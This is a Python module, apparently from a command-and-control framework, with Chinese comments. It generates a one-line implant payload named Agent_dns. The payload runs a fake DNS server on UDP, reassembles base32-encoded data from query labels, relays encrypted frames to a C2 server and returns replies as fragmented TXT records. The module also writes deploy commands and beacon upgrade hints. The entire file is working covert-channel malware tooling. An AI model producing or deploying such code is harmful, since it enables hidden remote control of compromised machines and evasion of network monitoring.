"""
@module: agent_dns
@desc: 生成 Agent_dns 一句话 python 载荷: 植入物 DNS 查询连入(UDP, TXT 分片), 每查询 TCP 帧中继到 server
@params: host port [server_key_hex] [out_dir] [agent_id] [domain]
"""
import json
import os
import secrets

from server.core.bootstrap import deploy_command
from server.transports.agent_base import relay_code

MODULE = {
    "desc": "生成 Agent_dns 一句话 python 载荷(DNS UDP 隧道中继)",
    "params": [
        ("host", "必填，server 地址"),
        ("port", "必填，server implant 端口"),
        ("server_key_hex", "可选；缺省从 server/config.json 读取 implant_key"),
        ("out_dir", "默认 s_modules/output"),
        ("agent_id", "可选；中继标识，转发 register 时 via=agent_dns:<id>"),
        ("domain", "可选；隧道域名，默认用 host"),
    ],
}

_SERVER_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_CONFIG_PATH = os.path.join(_SERVER_DIR, "config.json")
_DEFAULT_OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                            "output")

_LISTEN_CODE = '''\
import socket as _sa,struct as _st,base64 as _b64,time as _tm
_RC={}
_C={}
def _b32e(d):
 return _b64.b32encode(d).decode().rstrip("=")
def _b32d(s):
 return _b64.b32decode(s+"="*(-len(s)%8))
def _pq(pkt):
 if len(pkt)<12:return None
 qid=pkt[:2]
 qd=_st.unpack(">H",pkt[4:6])[0]
 if qd==0:return None
 off=12;labels=[]
 while off<len(pkt):
  ln=pkt[off]
  if ln==0:off+=1;break
  if ln&0xC0:return None
  off+=1
  labels.append(pkt[off:off+ln].decode("ascii","replace"))
  off+=ln
 if off+4>len(pkt):return None
 qt=_st.unpack(">HH",pkt[off:off+4])
 return qid,labels,qt[0]
def _btxt(qid,labels,qtype,chunks):
 qname=b"".join(bytes([len(p)])+p.encode("ascii") for p in labels)+b"\\x00"
 hdr=qid+_st.pack(">HHHHH",0x8180,1,len(chunks),0,0)
 ans=b""
 for ch in chunks:
  rd=bytes([len(ch)])+ch
  ans+=(b"\\xc0\\x0c"+_st.pack(">HHI",16,1,60)+_st.pack(">H",len(rd))+rd)
 return hdr+qname+_st.pack(">HH",qtype,1)+ans
def _hd(f):
 return _st.pack(">I", len(f) ^ int.from_bytes(h.sha256(_AK + b"len").digest()[:4], "big")) + f
def _txtresp(qid,labels,qtype,frame,bid):
 # 帧须带 4 字节掩码长度头(与 relay_code 的 S 同构): implant 端 recv_frame
 # 第一步就读掩码头再按长度取帧体——裸 E() 密文会被当头解析,长度错乱
 # MAC 必败,整条 DNS 中继不可用(2026-09-04 修复)
 frame=_hd(frame)
 b32=_b32e(frame)
 chunks=[b32[i:i+60] for i in range(0,len(b32),60)]
 if bid and len(chunks)>40:
  if len(_RC)>512:_RC.clear()
  _RC[bid]=(_tm.time(),chunks)
  return _btxt(qid,labels,qtype,[("s%d"%len(chunks)).encode()])
 return _btxt(qid,labels,qtype,[c.encode() for c in chunks] or [b""])
def _handle(pkt):
 q=_pq(pkt)
 if not q:return b""
 qid,labels,qtype=q
 if len(labels)<3:return _btxt(qid,labels,qtype,[b""])
 if labels[0]=="poll":
  bid=labels[1]
  resp=relay_tx(None,bid)
  if not resp:resp=e.dumps({"type":"pong"}).encode()
  return _txtresp(qid,labels,qtype,E(resp,_AK),bid)
 if labels[0].startswith("r") and labels[0][1:].isdigit():
  idx=int(labels[0][1:]);bid=labels[1]
  it=_RC.get(bid)
  ch=b""
  if it and 0<=idx<len(it[1]):ch=it[1][idx].encode()
  return _btxt(qid,labels,qtype,[ch])
 try:
  seg,seq,total,bid=labels[0],int(labels[1]),int(labels[2]),labels[3]
 except:
  return _btxt(qid,labels,qtype,[b""])
 if total<=0 or total>12000 or not(0<=seq<total):
  return _btxt(qid,labels,qtype,[b""])
 c=_C.setdefault(bid,{})
 c[seq]=seg
 if len(c)<total:
  return _btxt(qid,labels,qtype,[b""])
 full="".join(c[i] for i in range(total))
 _C.pop(bid,None)
 try:
  m=e.loads(D(_b32d(full)[4:],_AK).decode())
  if not bid:bid=m.get("id","")
  resp=relay_tx(e.dumps(m).encode(),bid)
 except:
  return _btxt(qid,labels,qtype,[b""])
 if not resp:resp=e.dumps({"type":"pong"}).encode()
 return _txtresp(qid,labels,qtype,E(resp,_AK),bid)
def run():
 s=_sa.socket(_sa.AF_INET,_sa.SOCK_DGRAM)
 s.setsockopt(_sa.SOL_SOCKET,_sa.SO_REUSEADDR,1)
 try:s.bind(("0.0.0.0",_LP))
 except Exception as e:print("agent bind failed:",e);return
 s.settimeout(1)
 while 1:
  try:
   pkt,addr=s.recvfrom(4096)
  except _sa.timeout:
   continue
  except:
   break
  try:
   r=_handle(pkt)
   if r:s.sendto(r,addr)
  except:pass
run()
'''


def _read_server_key() -> bytes:
    """从 server/config.json 读取 implant_key（agent↔server 用）。"""
    try:
        with open(_CONFIG_PATH, "r", encoding="utf-8") as f:
            raw = json.load(f)
        key = raw.get("implant_key", "")
        if key and len(key) == 64:
            return bytes.fromhex(key)
    except (OSError, ValueError, json.JSONDecodeError):
        pass
    return None


def run(host, port, server_key_hex=None, out_dir=None, agent_id=None,
        domain=""):
    """生成 Agent_dns 代码与部署命令。"""
    port = int(port)
    server_key = None
    if server_key_hex:
        server_key = bytes.fromhex(server_key_hex)
    else:
        server_key = _read_server_key()
        if server_key is None:
            return {"status": "error",
                    "message": "config.json 无有效 implant_key。"
                               "请先 s_exec keygen。"}

    agent_key = secrets.token_bytes(32)
    out_dir = out_dir or _DEFAULT_OUT
    os.makedirs(out_dir, exist_ok=True)

    listen_port = _pick_listen_port()
    via = f"agent_dns:{agent_id}" if agent_id else "agent_dns"
    code = relay_code(str(list(server_key)).replace(" ", ""),
                      str(list(agent_key)).replace(" ", ""),
                      host, port, via, long_lived=False)
    code += _LISTEN_CODE.replace("_LP", str(listen_port))
    compile(code, "<agent_dns>", "exec")  # 生成即校验

    command = deploy_command(code)
    files = {
        "xor_key": os.path.join(out_dir, "agent_dns_key.hex"),
        "command": os.path.join(out_dir, "agent_dns_command.txt"),
    }
    with open(files["xor_key"], "w", encoding="utf-8") as f:
        f.write(agent_key.hex() + "\n")
    with open(files["command"], "w", encoding="utf-8") as f:
        f.write(command + "\n")

    return {
        "status": "ok",
        "agent_key": agent_key.hex(),
        "listen_port": listen_port,
        "deploy": command,
        "code": code,
        "files": files,
        "uplevel_hint": (
            f"载荷升级: s_exec transport_dns {host} {listen_port} "
            f"{agent_key.hex()} {domain or host}\n"
            f"然后: uplevel_dns <beacon_id> {host} {listen_port} "
            f"{agent_key.hex()} {domain or host}"
        ),
    }


def _pick_listen_port() -> int:
    """临时端口探测（listen 端口与 server 端口错开）。"""
    s = __import__("socket").socket()
    s.bind(("0.0.0.0", 0))
    port = s.getsockname()[1]
    s.close()
    return port


if __name__ == "__main__":
    print("usage: s_exec agent_dns <host> <port> [server_key_hex]")
